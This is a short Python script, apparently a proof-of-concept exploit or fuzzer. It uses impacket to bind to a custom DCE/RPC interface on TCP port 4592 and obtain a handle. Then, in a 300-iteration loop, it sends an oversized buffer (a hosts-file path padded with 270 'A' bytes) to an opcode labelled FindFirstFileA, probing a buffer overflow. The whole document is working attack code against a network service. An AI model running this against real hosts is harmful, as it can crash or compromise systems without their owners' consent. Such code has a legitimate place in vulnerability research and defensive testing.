import sys, struct
from impacket import uuid
from impacket.dcerpc.v5 import transport

def call(dce, opcode, stubdata):
  dce.call(opcode, stubdata)
  res = -1
  try:
    res = dce.recv()
  except Exception as e:
    print("Exception encountered..." + str(e))
    sys.exit(1)
  return res

def LoopOpCode(count):
  if len(sys.argv) != 2:
    print("Provide only host arg")
    sys.exit(1)

  port = 4592
  interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
  version = "1.0" 

  host = sys.argv[1]

  string_binding = "ncacn_ip_tcp:%s" % host
  trans = transport.DCERPCTransportFactory(string_binding)
  trans.set_dport(port)

  print("Connecting to the target")

  dce = trans.get_dce_rpc()
  dce.connect()

  iid = uuid.uuidtup_to_bin((interface, version))
  dce.bind(iid)

  print("Getting a handle to the RPC server")
  stubdata = struct.pack("<I", 0x02)
  res = call(dce, 4, stubdata)
  if res == -1:
    print("Something went wrong")
    sys.exit(1)
  res = struct.unpack("III", res)

  if (len(res) < 3):
    print("Received unexpected length value")
    sys.exit(1)

  print("Sending payload")

  val = res[2]

  # print buffer offset 260
  opcode = 0x283c # FindFirstFileA
  buf = b"C:\\Windows\\System32\\drivers\\etc\\hosts\x00"
  buf += b"\x41" * 270
  stubdata = struct.pack("<IIII", val, opcode, len(buf), len(buf))
  stubdata += buf
  res = call(dce, 1, stubdata)
  print(res)

  print("Done, disconnecting")

  dce.disconnect()

for x in range(1,300):
  print(x)
  LoopOpCode(x)
